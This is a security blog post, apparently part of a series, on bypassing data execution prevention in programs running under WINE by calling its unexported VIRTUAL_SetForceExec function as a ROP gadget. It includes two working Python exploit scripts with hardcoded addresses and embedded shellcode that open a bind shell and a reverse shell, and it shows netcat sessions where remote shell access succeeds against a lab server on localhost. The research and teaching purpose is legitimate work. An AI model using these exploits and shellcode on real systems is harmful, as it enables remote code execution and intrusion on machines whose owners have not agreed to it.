@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Pointers to the void  | Attacking applications running under WINE (Part III)</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="generator" content="Hugo 0.47.1" />
+    
+    
+      <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+    
+
+    
+    
+      <link href="/dist/css/app.d98f2eb6bcd1eaedb7edf166bd16af26.css" rel="stylesheet">
+    
+
+    
+
+    
+      
+    
+
+    
+
+    <meta property="og:title" content="Attacking applications running under WINE (Part III)" />
+<meta property="og:description" content="VIRTUAL_SetForceExec - WINE&rsquo;s magic gadget In the last part of the series I demonstated a way to make the stack executable by returning to VirtualProtect. This is a nice and easy way to achieve arbitrary code execution - as long as you target a 32 bit programm. When targeting 64 bit programs there is a nasty obstacle to this trick: The x64 calling convention ships the first 4 parameters in the registers RCX, RDX, R8, and R9." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://schlafwandler.github.io/posts/attacking-wine-part-iii/" /><meta property="article:published_time" content="2019-05-27T22:11:44&#43;02:00"/>
+<meta property="article:modified_time" content="2019-05-27T22:11:44&#43;02:00"/>
+
+<meta itemprop="name" content="Attacking applications running under WINE (Part III)">
+<meta itemprop="description" content="VIRTUAL_SetForceExec - WINE&rsquo;s magic gadget In the last part of the series I demonstated a way to make the stack executable by returning to VirtualProtect. This is a nice and easy way to achieve arbitrary code execution - as long as you target a 32 bit programm. When targeting 64 bit programs there is a nasty obstacle to this trick: The x64 calling convention ships the first 4 parameters in the registers RCX, RDX, R8, and R9.">
+
+
+<meta itemprop="datePublished" content="2019-05-27T22:11:44&#43;02:00" />
+<meta itemprop="dateModified" content="2019-05-27T22:11:44&#43;02:00" />
+<meta itemprop="wordCount" content="2639">
+
+
+
+<meta itemprop="keywords" content="WINE," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Attacking applications running under WINE (Part III)"/>
+<meta name="twitter:description" content="VIRTUAL_SetForceExec - WINE&rsquo;s magic gadget In the last part of the series I demonstated a way to make the stack executable by returning to VirtualProtect. This is a nice and easy way to achieve arbitrary code execution - as long as you target a 32 bit programm. When targeting 64 bit programs there is a nasty obstacle to this trick: The x64 calling convention ships the first 4 parameters in the registers RCX, RDX, R8, and R9."/>
+
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-navy">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="https://schlafwandler.github.io" class="f3 fw2 hover-white no-underline white-90 dib">
+      Pointers to the void
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/tags/" title=" page">
+              
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+
+    <header class="mt4 w-100">
+      <p class="f6 b helvetica tracked">
+          
+        POSTS
+      </p>
+      <h1 class="f1 athelas mb1">Attacking applications running under WINE (Part III)</h1>
+      
+      <time class="f6 mv4 dib tracked" datetime="2019-05-27T22:11:44&#43;02:00">May 27, 2019</time>      
+      
+      
+    </header>
+
+    <section class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l">
+
+<h2 id="virtual-setforceexec-wine-s-magic-gadget">VIRTUAL_SetForceExec - WINE&rsquo;s magic gadget</h2>
+
+<p>In the <a href="https://schlafwandler.github.io/posts/attacking-wine-part-ii/">last part</a> of the <a href="https://schlafwandler.github.io/series/attacking-wine/">series</a> I demonstated a way to make the stack executable by returning to VirtualProtect.
+This is a nice and easy way to achieve arbitrary code execution - as long as you target a 32 bit programm.
+When targeting 64 bit programs there is a nasty obstacle to this trick:
+The <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2017">x64 calling convention</a> ships the first 4 parameters in the registers RCX, RDX, R8, and R9.
+So we can not simply put the parameters on the stack above the return address and return to VirtualProtect, because VirtualProtect doesn&rsquo;t receive it&rsquo;s parameters via the stack.</p>
+
+<p>We <em>could</em> look out for some ROP gadgets that allow us to control the RCX, RDX, R8, and R9 registers, and use them to place our parameters there before returning to VirtualProtect.
+But wouldn&rsquo;t it be so much easier if there was one single gadget that we could call to make all our DEP worries go away?</p>
+
+<p>Meet your new friend VIRTUAL_SetForceExec!</p>
+
+<h3 id="virtual-setforceexec">VIRTUAL_SetForceExec</h3>
+
+<p>VIRTUAL_SetForceExec resides in <a href="https://github.com/wine-mirror/wine/blob/master/dlls/ntdll/virtual.c#L2351">ntdll/virtual.c</a>.</p>
+
+<p>What is does: well, it makes the stack, the heap and the data sections of the .exe and the .dll.so&rsquo;s executable!</p>
+
+<pre><code class="language-C">/***********************************************************************
+ *           VIRTUAL_SetForceExec
+ *
+ * Whether to force exec prot on all views.
+ */
+void VIRTUAL_SetForceExec( BOOL enable )				[1]
+{
+    struct file_view *view;
+    sigset_t sigset;
+
+    server_enter_uninterrupted_section( &amp;csVirtual, &amp;sigset );
+    if (!force_exec_prot != !enable)  /* change all existing views */	[2]
+    {
+        force_exec_prot = enable;
+
+        WINE_RB_FOR_EACH_ENTRY( view, &amp;views_tree, struct file_view, entry )
+        {
+            /* file mappings are always accessible */
+            BYTE commit = is_view_valloc( view ) ? 0 : VPROT_COMMITTED;
+
+            mprotect_range( view-&gt;base, view-&gt;size, commit, 0 );	[3]
+        }
+    }
+    server_leave_uninterrupted_section( &amp;csVirtual, &amp;sigset );
+}
+</code></pre>
+
+<p>It takes an &lsquo;enable&rsquo; parameter [1] and, if force_exec_prot is not already set [2], sets execute permission on all writable memory the windows application is aware of [3].
+If we can call it (or return to it) with the first parameter set to anything-but-zero, we have lots of beautiful RWX space available.
+How convenient!</p>
+
+<h4 id="testing-virtual-setforceexec">Testing VIRTUAL_SetForceExec</h4>
+
+<p>So, let&rsquo;s try it (<a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_III/setforceexec_test.c">source</a>,
+<a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_III/setforceexec_test.exe">32bit.exe</a>,
+ <a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_III/setforceexec_test64.exe">64bit.exe</a>):</p>
+
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// i686-w64-mingw32-gcc -o setforceexec_test.exe setforceexec_test.c
+// x86_64-w64-mingw32-gcc -o setforceexec_test64.exe setforceexec_test.c
+
+typedef (*pVIRTUAL_SetForceExec)(
+    unsigned long enable
+    );
+
+#define VIRTUAL_SetForceExec_32 0x7bca1270
+#define VIRTUAL_SetForceExec_64 0x7bcbbb90
+
+#if _WIN64 || __amd64__
+#define VIRTUAL_SetForceExec_ptr VIRTUAL_SetForceExec_64
+#else
+#define VIRTUAL_SetForceExec_ptr VIRTUAL_SetForceExec_32
+#endif
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+    pVIRTUAL_SetForceExec VIRTUAL_SetForceExec = (pVIRTUAL_SetForceExec) VIRTUAL_SetForceExec_ptr;
+
+    printf(&quot;Press any key to get many RWX pages!\n&quot;);
+    getchar();
+
+    VIRTUAL_SetForceExec(-1);
+
+    printf(&quot;There should be lots of executable+writeable memory now.\n&quot;);
+    getchar();
+
+    return 0;
+}
+</code></pre>
+
+<p>What does this program do?
+Fist, it waits at a getchar() to give you time to attach gdb.
+Then it calls VIRTUAL_SetForceExec with the parameter -1 (which is, notably, not 0).
+At last, it waits again at the second getchar(), giving you time to stop and re-examine the process.</p>
+
+<p>Two things to notice here:</p>
+
+<p>First, VIRTUAL_SetForceExec is not exported by ntdll.dll.so, so we have to find it&rsquo;s address some other way (see <a href="https://schlafwandler.github.io/posts/attacking-wine-part-iii/#locating-virtual-setforceexec">below</a>),
+hardcode it into the .c file and cast it to a function pointer.
+You probably have to adjust the hardcoded values for your version of ntdll.dll.so (if your not using the exact same version as I do).</p>
+
+<p>Second, VIRTUAL_SetForceExec is not declared as a WINAPI function in ntdll/virtual.c.
+It therefore does not follow the stdcall or Microsoft x64 calling conventions.
+It behaves as any other function in a linux .so file (cdecl on x86 systems, System V AMD64 ABI on x86-64).
+This does not make that much difference here, just that pVIRTUAL_SetForceExec function pointer type must not be declared as WINAPI as well.
+It will however make some difference later on, during exploitation on WINE x86-64, so keep it in mind.</p>
+
+<p>If we finally run the test program and attach gdb during the first getchar(), we find the address space like we expect it:
+Some pages writable, some page executable, but no page both writable <strong>and</strong> executable.</p>
+
+<pre><code>Start              End                Offset             Perm Path
+0x0000000000010000 0x0000000000020000 0x0000000000000000 rw- 
+0x0000000000020000 0x0000000000120000 0x0000000000000000 --- 
+0x0000000000120000 0x0000000000121000 0x0000000000000000 rw- 
+0x0000000000121000 0x0000000000122000 0x0000000000000000 --- 
+0x0000000000122000 0x0000000000130000 0x0000000000000000 --- 
+0x0000000000130000 0x0000000000133000 0x0000000000000000 rw- 
+0x0000000000133000 0x0000000000140000 0x0000000000000000 --- 
+0x0000000000140000 0x0000000000142000 0x0000000000000000 --- 
+0x0000000000142000 0x0000000000340000 0x0000000000000000 rw- 
+0x0000000000340000 0x0000000000400000 0x0000000000000000 --- 
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /[...]/setforceexec_test64.exe
+0x0000000000401000 0x0000000000403000 0x0000000000000000 r-x 
+0x0000000000403000 0x0000000000404000 0x0000000000000000 rw- 
+0x0000000000404000 0x0000000000407000 0x0000000000000000 r-- 
+0x0000000000407000 0x0000000000409000 0x0000000000000000 rw- 
+0x0000000000409000 0x000000000040a000 0x0000000000004000 rw- /[...]/setforceexec_test64.exe
+0x000000000040a000 0x000000000040b000 0x0000000000000000 rw- 
+[...]
+</code></pre>
+
+<p>After we let the program continue past the VIRTUAL_SetForceExec (by pressing any key) and examine it again, the memory looks more like this:</p>
+
+<pre><code>Start              End                Offset             Perm Path
+0x0000000000010000 0x0000000000020000 0x0000000000000000 rwx 
+0x0000000000020000 0x0000000000120000 0x0000000000000000 --- 
+0x0000000000120000 0x0000000000121000 0x0000000000000000 rwx 
+0x0000000000121000 0x0000000000122000 0x0000000000000000 --- 
+0x0000000000122000 0x0000000000130000 0x0000000000000000 --- 
+0x0000000000130000 0x0000000000133000 0x0000000000000000 rwx 
+0x0000000000133000 0x0000000000140000 0x0000000000000000 --- 
+0x0000000000140000 0x0000000000142000 0x0000000000000000 --- 
+0x0000000000142000 0x0000000000340000 0x0000000000000000 rwx 
+0x0000000000340000 0x0000000000400000 0x0000000000000000 --- 
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /[...]/setforceexec_test64.exe
+0x0000000000401000 0x0000000000403000 0x0000000000000000 r-x 
+0x0000000000403000 0x0000000000404000 0x0000000000000000 rwx 
+0x0000000000404000 0x0000000000407000 0x0000000000000000 r-x 
+0x0000000000407000 0x0000000000409000 0x0000000000000000 rwx 
+0x0000000000409000 0x000000000040a000 0x0000000000004000 rwx /[...]/setforceexec_test64.exe
+0x000000000040a000 0x000000000040b000 0x0000000000000000 rwx 
+0x000000000040b000 0x0000000000460000 0x0000000000000000 r-x 
+0x0000000000460000 0x0000000000461000 0x0000000000057000 r-x /[...]/setforceexec_test64.exe
+0x0000000000461000 0x0000000000466000 0x0000000000000000 r-x 
+0x0000000000466000 0x0000000000470000 0x0000000000000000 --- 
+0x0000000000470000 0x0000000000480000 0x0000000000000000 rwx 
+[...]
+0x000000007b66d000 0x000000007b81f000 0x000000000026c000 rwx /usr/lib/x86_64-linux-gnu/wine/kernel32.dll.so
+[...]
+0x000000007bd07000 0x000000007bd13000 0x0000000000106000 rwx /usr/lib/x86_64-linux-gnu/wine/ntdll.dll.so
+0x000000007bd13000 0x000000007bd26000 0x0000000000000000 rwx 
+[...]
+0x000000007ffe0000 0x000000007fff0000 0x0000000000000000 rwx 
+[...]
+0x00007f5b73e39000 0x00007f5b73e43000 0x00000000000d3000 rwx /usr/lib/x86_64-linux-gnu/wine/msvcrt.dll.so
+0x00007f5b73e43000 0x00007f5b73e45000 0x0000000000000000 rwx 
+[...]
+0x00007fffba2f6000 0x00007fffba318000 0x0000000000000000 rw- [stack]
+0x00007fffba319000 0x00007fffba31c000 0x0000000000000000 r-- [vvar]
+0x00007fffba31c000 0x00007fffba31e000 0x0000000000000000 r-x [vdso]
+0x00007ffffe000000 0x00007fffffea8000 0x0000000000000000 --- 
+0x00007fffffea8000 0x00007fffffeac000 0x0000000000000000 rwx 
+0x00007fffffeac000 0x00007fffffeaf000 0x0000000000000000 --- 
+0x00007fffffeaf000 0x00007fffffeb0000 0x0000000000000000 rwx 
+0x00007fffffeb0000 0x00007fffffff0000 0x0000000000000000 rw- 
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+</code></pre>
+
+<p>The stack, the heap, the writable data segments of the libraries and some other areas are now executable.
+And all of them are located at predictable addresses.
+This should be enough choice for a nice shellcode location.</p>
+
+<h4 id="locating-virtual-setforceexec">Locating VIRTUAL_SetForceExec</h4>
+
+<p>So, how do we find VIRTUAL_SetForceExec for any given version of ntdll.dll.so?
+Sadly, it is not exported, so we can&rsquo;t easily find it with readelf.
+But it&rsquo;s called by <a href="http://uninformed.org/?v=2&amp;a=4">NtSetInformationProcess</a> from <a href="https://github.com/wine-mirror/wine/blob/master/dlls/ntdll/process.c#L628">ntdll/process.c</a> to enable or disable the enforcement of data execution prevention.</p>
+
+<pre><code class="language-C">/******************************************************************************
+ * NtSetInformationProcess [NTDLL.@]
+ * ZwSetInformationProcess [NTDLL.@]
+ */
+NTSTATUS WINAPI NtSetInformationProcess(
+    IN HANDLE ProcessHandle,
+    IN PROCESSINFOCLASS ProcessInformationClass,
+    IN PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength)
+{
+    NTSTATUS ret = STATUS_SUCCESS;
+
+    switch (ProcessInformationClass)
+    {
+
+    [...]
+
+    case ProcessExecuteFlags:										[1]
+        if (ProcessInformationLength != sizeof(ULONG))
+            return STATUS_INVALID_PARAMETER;
+        else if (execute_flags &amp; MEM_EXECUTE_OPTION_PERMANENT)						[2]
+            return STATUS_ACCESS_DENIED;
+        else
+        {
+            BOOL enable;
+            switch (*(ULONG *)ProcessInformation &amp; (MEM_EXECUTE_OPTION_ENABLE|MEM_EXECUTE_OPTION_
+            {
+            case MEM_EXECUTE_OPTION_ENABLE:
+                enable = TRUE;										[3]
+                break;
+            case MEM_EXECUTE_OPTION_DISABLE:
+                enable = FALSE;
+                break;
+            default:
+                return STATUS_INVALID_PARAMETER;
+            }
+            execute_flags = *(ULONG *)ProcessInformation;
+            VIRTUAL_SetForceExec( enable );								[4]
+        }
+        break;
+
+    [...]
+</code></pre>
+
+<p>This gives us an easy way to find VIRTUAL_SetForceExec in a ntdll.dll.so binary by reading NtSetInformationProcess&rsquo; code.</p>
+
+<p>Here&rsquo;s the relevant section of NtSetInformationProcess, as decompiled by ghidra:</p>
+
+<pre><code class="language-C">      else {
+        if (param_2 != 0x22) goto LAB_7bc69f80;		[1]
+        if (param_4 == 4) {
+          if ((_DAT_7bcea790 &amp; 8) == 0) {		[2]
+            uVar1 = *param_3 &amp; 3;
+            if (uVar1 == 1) {
+              uVar2 = 0;
+            }
+            else {
+              puVar4 = &amp;DAT_c000000d;
+              if (uVar1 != 2) goto LAB_7bc69f40;
+              uVar2 = 1;
+            }
+            _DAT_7bcea790 = *param_3;
+            FUN_7bca1270(uVar2);			[3]
+            puVar4 = (undefined *)0x0;
+          }
+          else {
+            puVar4 = (undefined *)0xc0000022;
+          }
+          goto LAB_7bc69f40;
+        }
+      }
+</code></pre>
+
+<p>To find VIRTUAL_SetForceExec, locate NtSetInformationProcess (it is exported by ntdll.dll.so).
+Then read trough the different switch cases until you find the test for ProcessExecuteFlags (0x22) ([1], usually close to the end).
+A decompiler makes this whole process a lot easier, but notice that in my test ghidra decompiles the switch construct as a chain of if-else&rsquo;s, so don&rsquo;t get confused by that.
+Once you have found the test for 0x22, the call to VIRTUAL_SetForceExec is nearby (here at [3]).
+It&rsquo;s easy to spot because it is the only function call in this case block.</p>
+
+<p>Notice that a check for the MEM_EXECUTE_OPTION_PERMANENT exists [2].
+But this check is done in NtSetInformationProcess, not VIRTUAL_SetForceExec, and quite early in the ProcessExecuteFlags case block.
+So we bypass it completely by calling VIRTUAL_SetForceExec directly.</p>
+
+<h4 id="the-perfect-gadget">The perfect gadget</h4>
+
+<p>Lets summarise:</p>
+
+<ul>
+<li>VIRTUAL_SetForceExec is part of ntdll.dll.so, so it&rsquo;s present in <em>every</em> <em>single</em> <em>process</em> running under WINE.</li>
+<li>It&rsquo;s not that hard to find and identify.</li>
+<li>It&rsquo;s address in memory is constant, because no ASLR is applied to ntdll.dll.so.</li>
+<li>It takes only one parameter, and for our purposes this parameter must simply be anything but 0.</li>
+<li>And if called, it makes a lot of writable memory executable and returns.</li>
+</ul>
+
+<p>I call this the perfect ROP gadget.</p>
+
+<h2 id="modifying-the-exploit">Modifying the exploit</h2>
+
+<p>So, lets modify the exploit from <a href="https://schlafwandler.github.io/posts/attacking-wine-part-ii/#arbitrary-code-execution">part II</a> to use this gadget (<a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_III/text_3_exploit_ForceExec.py">code</a>):</p>
+
+<pre><code class="language-python">from pwn import *
+
+# 836   Linux/x86   Tiny Shell Bind TCP - 73 bytes
+# Written in 2013 by Geyslan G. Bem, Hacking bits
+# http://shell-storm.org/shellcode/files/shellcode-836.php
+# Opens tcp shell at port 11111
+shellcode = &quot;&quot;
+shellcode += &quot;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a&quot;
+shellcode += &quot;\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68&quot;
+shellcode += &quot;\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1&quot;
+shellcode += &quot;\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd&quot;
+shellcode += &quot;\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f&quot;
+shellcode += &quot;\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f&quot;
+shellcode += &quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3&quot;
+shellcode += &quot;\x41\xcd\x80&quot;
+
+VIRTUAL_SetForceExec_ptr    = 0x7bca1270
+shellcode_ptr               = 0x33fcc0
+
+# offset in exploitstr 152
+exploitstr = &quot;A&quot;*152
+
+# ROP-call to VIRTUAL_SetForceExec
+exploitstr += p32(VIRTUAL_SetForceExec_ptr)			# [1]
+
+# return to shellcode
+exploitstr += p32(shellcode_ptr)				# [2]
+
+# parameter to VIRTUAL_SetForceExec
+exploitstr += p32(0x90909090)       # everything != 0 would work, # [3]
+                                    # so we can put something usefull 
+                                    # there as well
+exploitstr += shellcode      
+
+c = connect(&quot;127.0.0.1&quot;,31337)
+c.send(exploitstr)
+</code></pre>
+
+<p>The exploit overwrites the return address with a pointer to VIRTUAL_SetForceExec ([1]).
+The value after that is the address VIRTUAL_SetForceExec will return to after completion.
+We place the address of the shellcode here ([2]).
+Than follows the parameter to VIRTUAL_SetForceExec.
+Any value that is not 0x00000000 will work for us, so we place some NOPs there
+(we could also omit these and let the shellcode start directly here, but this makes it a bit easier to illustrate).
+After that comes the shellcode.</p>
+
+<p>The <a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_II/simple_server_target/Release/simple_server_target.exe">target</a> is the same as in Part II.</p>
+
+<p>Testing it:</p>
+
+<pre><code>$ python text_3_exploit_ForceExec.py 
+[+] Opening connection to 127.0.0.1 on port 31337: Done
+[*] Closed connection to 127.0.0.1 port 31337
+$ nc -v 127.0.0.1 11111
+Connection to 127.0.0.1 11111 port [tcp/*] succeeded!
+uname -a
+Linux testsystem 4.18.0-18-generic #19-Ubuntu SMP Tue Apr 2 18:13:16 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+^C
+
+</code></pre>
+
+<p>So it works as well as the old exploit.
+It&rsquo;s just a bit shorter, because we don&rsquo;t have to mess with the parameters to VirtualProtect.</p>
+
+<h2 id="64-bit-version">64 bit version</h2>
+
+<p>The VIRTUAL_SetForceExec gadget gets even more useful against a x86-64 target.</p>
+
+<p>Among the many differences in 64 bit mode is one that makes the return-to-function trick quite painfull:
+The first few function parameters are no longer passed on the stack, but in registers.
+That&rsquo;s good for performance, but bad for an exploiter that only has controls of the stack.</p>
+
+<p>One way around this is to chain a lot of ROP gadgets together to fill the registers with our parameters and then call (return to) the function.
+Depending on the available gadgets, this can require a lot of dirty work.</p>
+
+<p>The VIRTUAL_SetForceExec gadget takes a lot less work:
+It&rsquo;s only parameter just has to not be zero.
+This can easily be already the case when we take the control flow over.
+And even if the register by some bad luck is zero at this point, all we need is a second gadget that changes it to, well, anything else.
+This makes it a lot easier.</p>
+
+<h4 id="finding-virtual-setforceexec-on-x86-64-systems">Finding VIRTUAL_SetForceExec on x86-64 systems</h4>
+
+<p>The 64 bit version of ntdll.dll.so is a different file from the 32 bit version, compiled for a different target architecture.
+So the address found for the 32 bit version will obviously not work.
+Luckily, the procedure for finding it on x86 can be transferred without any changes:
+Find the exported NtSetInformationProcess, find the handling of the <code>ProcessExecuteFlags</code>(0x22) case, find the call to VIRTUAL_SetForceExec.</p>
+
+<h4 id="calling-conventions">Calling conventions</h4>
+
+<p>Above I noticed that VIRTUAL_SetForceExec follows the cdecl (x86) or System V AMD64 ABI calling convention, not Microsofts stdcall or Microsoft x64 convention.
+This did not matter much on x86: both transfer the parameters via the stack.
+On x86-64 systems, both transfer the first parameters via registers: the first four parameters in RCX, RDX, R8, R9 in Microsoft x64, the first six parameters in RDI, RSI, RDX, RCX, R8, R9 under System V AMD64 ABI.</p>
+
+<p>Since VIRTUAL_SetForceExec is not declared as a WINAPI function (which would imply stdcall/Microsoft x64), it expects to be called using the System V AMD64 ABI convention.
+So it&rsquo;s first and only parameter is passed via RDI, not RCX as in a WINAPI function.</p>
+
+<h3 id="porting-the-exploit">Porting the exploit</h3>
+
+<p>So lets write an exploit against the 64 bit version:
+We start by running <a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_II/simple_server_target/x64/Release/simple_server_target.exe">simple_server_target.exe (64bit)</a> and placing a breakpoint on the return of the function handle_connection (0x1400010be).
+This is the point where we take over the controll flow.
+If we let the program return to VIRTUAL_SetForceExec from here, it will look in RDI for its first (and only) parameter.
+And here we notice we are out of luck:
+RDI is 0 - the one and only value we do <em>not</em> want it to be.
+But as stated above, this is not such a large inconvenience.</p>
+
+<h4 id="setting-rdi-using-a-rop-gadget">Setting RDI using a ROP gadget</h4>
+
+<p>All we need is a gadget that changes RDI to something else. Anything else.
+That&rsquo;s not hard to find:</p>
+
+<pre><code>$ ropper -f /usr/lib/x86_64-linux-gnu/wine/ntdll.dll.so --search &quot;pop rdi; ret&quot;
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi; ret
+
+[INFO] File: /usr/lib/x86_64-linux-gnu/wine/ntdll.dll.so
+0x000000007bc31b7e: pop rdi; ret; 
+</code></pre>
+
+<h4 id="the-exploit">The exploit</h4>
+
+<p>So here&rsquo;s everything that must be changed to make the exploit work against the 64 bit server target:</p>
+
+<ul>
+<li>The address of VIRTUAL_SetForceExec must be adapted to the 64 bit ntdll.dll.so</li>
+<li>The stack has a different starting position, so this must be changed as well</li>
+<li>The <code>pop rdi; ret</code> gadget must be inserted in the ROP chain, as well as the pop&rsquo;ed value for RDI</li>
+<li>The distance between the overflowed buffer and the overwritten RSP is 16 bytes shorter</li>
+<li>There is no more need for the parameter to VIRTUAL_SetForceExec on the stack</li>
+<li>The shellcode needs to be replaced by an x86-64 shellcode</li>
+</ul>
+
+<p>The final <a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_III/text_3_exploit_ForceExec_64.py">code</a>:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# 907	Linux/x86-64	Dynamic null-free reverse TCP shell - 65 bytes
+# http://shell-storm.org/shellcode/files/shellcode-907.php
+#####################################################
+#                                                   #
+#   Dynamic null-free reverse TCP shell(65 bytes)   *
+#           Written by Philippe Dugre               #
+#                                                   #
+#####################################################
+shellcode = 	b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e&quot;
+shellcode += 	b&quot;\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee&quot;
+shellcode += 	b&quot;\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54&quot;
+shellcode += 	b&quot;\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21&quot;
+shellcode += 	b&quot;\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52&quot;
+shellcode += 	b&quot;\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;
+shellcode += 	b&quot;\x51\x54\x5f\x0f\x05&quot;
+# (connects to 127.0.0.1 4444 via tcp)
+
+VIRTUAL_SetForceExec_ptr    = 0x7bcbbb90    # different gadget location
+shellcode_ptr               = 0x23fbc8      # diffent stack position
+pop_rdi_ret                 = 0x7bc31b7e    # set rdi to something != 0
+
+# offset in exploitstr 136
+exploitstr = &quot;A&quot;*136                        # some filler 'A' less than in 32bit version
+
+# ROP to pop rdi; ret
+exploitstr += p64(pop_rdi_ret)
+exploitstr += p64(0x4141414141414141)       # new value for rdi
+
+# ROP-call to VIRTUAL_SetForceExec
+exploitstr += p64(VIRTUAL_SetForceExec_ptr)
+
+# return to shellcode
+exploitstr += p64(shellcode_ptr)
+
+# and the shellcode itself
+exploitstr += shellcode 
+
+c = connect(&quot;127.0.0.1&quot;,31337)
+c.send(exploitstr)
+</code></pre>
+
+<h4 id="testing-the-exploit">Testing the exploit</h4>
+
+<p>This time the exploit starts a reverse shell that connects to 127.0.0.1 on port 4444.
+So we have to start a listener:</p>
+
+<pre><code>$ nc -lvp 4444 
+</code></pre>
+
+<p>The target is again the <a href="https://github.com/schlafwandler/attacking_wine/blob/master/Part_II/simple_server_target/x64/Release/simple_server_target.exe">simple_server_target (64 bit)</a> from Part II:</p>
+
+<pre><code>$ wine simple_server_target.exe
+</code></pre>
+
+<p>And start the exploit:</p>
+
+<pre><code>$ python text_3_exploit_ForceExec_64.py 
+[+] Opening connection to 127.0.0.1 on port 31337: Done
+[*] Closed connection to 127.0.0.1 port 31337
+$ 
+</code></pre>
+
+<p>The reverse shell should appear on the listener:</p>
+
+<pre><code>$ nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from localhost 52628 received!
+uname -a
+Linux testsystem 4.18.0-18-generic #19-Ubuntu SMP Tue Apr 2 18:13:16 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+^C
+
+</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>WINE&rsquo;s VIRTUAL_SetForceExec is definitely one of the most useful ROP gadgets one can imagine:
+it&rsquo;s in a predictable location, takes little to no prior setup to be used and effectively disables data execution prevention.
+That&rsquo;s basically the dream of everyone ever struggling with ROP.
+And because it&rsquo;s part of ntdll.dll.so, it&rsquo;s loaded into <em>every</em> <em>single</em> <em>process</em> running under WINE, just waiting to be used.</p>
+<ul class="pa0">
+  
+   <li class="list">
+     <a href="/tags/wine" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">WINE</a>
+   </li>
+  
+</ul>
+<div class="mt6">
+        
+      </div>
+    </section>
+
+    <aside class="w-30-l mt6-l"><div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">What&#39;s in this posts</p>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#virtual-setforceexec-wine-s-magic-gadget">VIRTUAL_SetForceExec - WINE&rsquo;s magic gadget</a>
+<ul>
+<li><a href="#virtual-setforceexec">VIRTUAL_SetForceExec</a>
+<ul>
+<li><a href="#testing-virtual-setforceexec">Testing VIRTUAL_SetForceExec</a></li>
+<li><a href="#locating-virtual-setforceexec">Locating VIRTUAL_SetForceExec</a></li>
+<li><a href="#the-perfect-gadget">The perfect gadget</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#modifying-the-exploit">Modifying the exploit</a></li>
+<li><a href="#64-bit-version">64 bit version</a>
+<ul>
+<li>
+<ul>
+<li><a href="#finding-virtual-setforceexec-on-x86-64-systems">Finding VIRTUAL_SetForceExec on x86-64 systems</a></li>
+<li><a href="#calling-conventions">Calling conventions</a></li>
+</ul></li>
+<li><a href="#porting-the-exploit">Porting the exploit</a>
+<ul>
+<li><a href="#setting-rdi-using-a-rop-gadget">Setting RDI using a ROP gadget</a></li>
+<li><a href="#the-exploit">The exploit</a></li>
+<li><a href="#testing-the-exploit">Testing the exploit</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">Related</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
